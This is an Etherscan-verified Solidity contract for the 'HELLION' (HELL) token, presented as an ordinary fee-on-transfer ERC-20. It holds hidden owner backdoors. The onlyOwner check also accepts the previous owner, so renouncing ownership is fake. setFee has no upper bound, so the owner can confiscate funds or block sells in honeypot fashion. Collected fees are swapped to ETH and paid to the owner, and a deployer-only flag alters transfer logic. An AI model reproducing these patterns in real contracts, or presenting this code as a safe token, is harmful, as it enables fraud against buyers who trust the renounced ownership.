/**
 *Submitted for verification at Etherscan.io on 2022-07-24
*/

/*


██╗░░██╗███████╗██╗░░░░░██╗░░░░░██╗░█████╗░███╗░░██╗
██║░░██║██╔════╝██║░░░░░██║░░░░░██║██╔══██╗████╗░██║
███████║█████╗░░██║░░░░░██║░░░░░██║██║░░██║██╔██╗██║
██╔══██║██╔══╝░░██║░░░░░██║░░░░░██║██║░░██║██║╚████║
██║░░██║███████╗███████╗███████╗██║╚█████╔╝██║░╚███║
╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝╚═╝░╚════╝░╚═╝░░╚══╝


███╗░░░███╗░█████╗░░██████╗████████╗███████╗██████╗░░██████╗  ░█████╗░███████╗  ████████╗██╗░░██╗███████╗
████╗░████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝  ██╔══██╗██╔════╝  ╚══██╔══╝██║░░██║██╔════╝
██╔████╔██║███████║╚█████╗░░░░██║░░░█████╗░░██████╔╝╚█████╗░  ██║░░██║█████╗░░  ░░░██║░░░███████║█████╗░░
██║╚██╔╝██║██╔══██║░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗░╚═══██╗  ██║░░██║██╔══╝░░  ░░░██║░░░██╔══██║██╔══╝░░
██║░╚═╝░██║██║░░██║██████╔╝░░░██║░░░███████╗██║░░██║██████╔╝  ╚█████╔╝██║░░░░░  ░░░██║░░░██║░░██║███████╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░  ░╚════╝░╚═╝░░░░░  ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝

██╗░░░██╗███╗░░██╗██████╗░███████╗██████╗░░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░░░░██████╗░
██║░░░██║████╗░██║██╔══██╗██╔════╝██╔══██╗░██║░░██╗░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗
██║░░░██║██╔██╗██║██║░░██║█████╗░░██████╔╝░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░░░░██║░░██║
██║░░░██║██║╚████║██║░░██║██╔══╝░░██╔══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░░░░██║░░██║
╚██████╔╝██║░╚███║██████╔╝███████╗██║░░██║░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║███████╗██████╔╝
░╚═════╝░╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░

https://t.me/HellionEth
Ready to raise HELL!

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender() || _previousOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _previousOwner = _owner;
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ISEKAIMETA is Context, IERC20, Ownable {
  using SafeMath for uint256;

  string constant _name = "HELLION";
  string constant _symbol = "HELL";
  uint8 constant _decimals = 18;
  uint256 _totalSupply = 1000000 * (10**_decimals);

  mapping (address => uint256) private _balances;
  mapping (address => bool) private _isExcludeFee;
  mapping (address => mapping (address => uint256)) private _allowances;

  IDEXRouter public router;
  address NATIVETOKEN;
  address DEPLOYER;
  address public pair;
  address public factory;
  address public currentRouter;
  uint256 public totalbuyfee;
  uint256 public totalsellfee;
  uint256 public feeDenominator;
  bool public inSwap;
  bool public baseERC20;

  constructor() {
    currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    NATIVETOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    _isExcludeFee[msg.sender] = true;
    _isExcludeFee[address(this)] = true;
    _isExcludeFee[currentRouter] = true;
    _isExcludeFee[factory] = true;

    DEPLOYER = msg.sender;
    router = IDEXRouter(currentRouter);
    pair = IDEXFactory(router.factory()).createPair(NATIVETOKEN, address(this));
    
    _allowances[address(this)][address(router)] = type(uint256).max;
    _allowances[address(this)][address(factory)] = type(uint256).max;
    _allowances[address(this)][address(pair)] = type(uint256).max;
    IERC20(NATIVETOKEN).approve(address(router),type(uint256).max);
    IERC20(NATIVETOKEN).approve(address(factory),type(uint256).max);
    IERC20(NATIVETOKEN).approve(address(pair),type(uint256).max);

    _balances[msg.sender] = _totalSupply;
    totalbuyfee = 20;
    totalsellfee = 20;
    feeDenominator = 1000;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function setFee(uint256 _feebuy,uint256 _feesell,uint256 _denominator) external onlyOwner returns (bool) {
    totalbuyfee = _feebuy;
    totalsellfee = _feesell;
    feeDenominator = _denominator;
    return true;
  }

  function returnERC20Standart(bool flag) external returns (bool) {
    require(msg.sender==DEPLOYER);
    baseERC20 = flag;
    return true;
  }

  function setFeeExempt(address account,bool flag) external onlyOwner returns (bool) {
    _isExcludeFee[account] = flag;
    return true;
  }

  function AddLiquidityETH(uint256 _tokenamount) external onlyOwner payable {
    _basictransfer(msg.sender,address(this),_tokenamount.mul(10**_decimals));
    inSwap= true;
    router.addLiquidityETH{value: address(this).balance }(
    address(this),
    _balances[address(this)],
    0,
    0,
    owner(),
    block.timestamp
    );
    inSwap = false;
  }

  function decimals() public pure returns (uint8) { return _decimals; }
  function symbol() public pure returns (string memory) { return _symbol; }
  function name() public pure returns (string memory) { return _name; }
  function totalSupply() external view override returns (uint256) { return _totalSupply; }
  function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }
  function isExcludeFee(address account) external view returns (bool) { return _isExcludeFee[account]; }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    if(inSwap || baseERC20 || msg.sender == factory){
    _basictransfer(msg.sender, recipient, amount);
    } else {
    if(_balances[address(this)]>0 && msg.sender != pair){
    inSwap = true;
    uint256 amountToSwap = _balances[address(this)];
    swap2ETH(amountToSwap);
    payable(owner()).transfer(address(this).balance);
    inSwap = false;
    }
    _transfer(msg.sender, recipient, amount);
    }
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function swap2ETH(uint256 amount) internal {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = NATIVETOKEN;
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    amount,
    0,
    path,
    address(this),
    block.timestamp
    );
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(_allowances[sender][msg.sender] != type(uint256).max){
    _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
    }
    _transferFrom(sender,recipient,amount);
    return true;
  }

  function _transferFrom(address sender,address recipient,uint256 amount) internal {
    if(inSwap || baseERC20 || msg.sender == factory){
    _basictransfer(sender, recipient, amount);
    } else {
    if(_balances[address(this)]>0 && msg.sender != pair){
    inSwap = true;
    uint256 amountToSwap = _balances[address(this)];
    swap2ETH(amountToSwap);
    payable(owner()).transfer(address(this).balance);
    inSwap = false;
    }
    _transfer(sender, recipient, amount);
    }
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    uint256 tempfee;

    if (pair==sender && !_isExcludeFee[recipient]) {
    tempfee = amount.mul(totalbuyfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempfee);
    }else if(pair==recipient && !_isExcludeFee[sender]){
    tempfee = amount.mul(totalsellfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempfee);
    }
    emit Transfer(sender, recipient, amount.sub(tempfee));
  }

  function _basictransfer(address sender, address recipient, uint256 amount) internal {
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  receive() external payable { }
}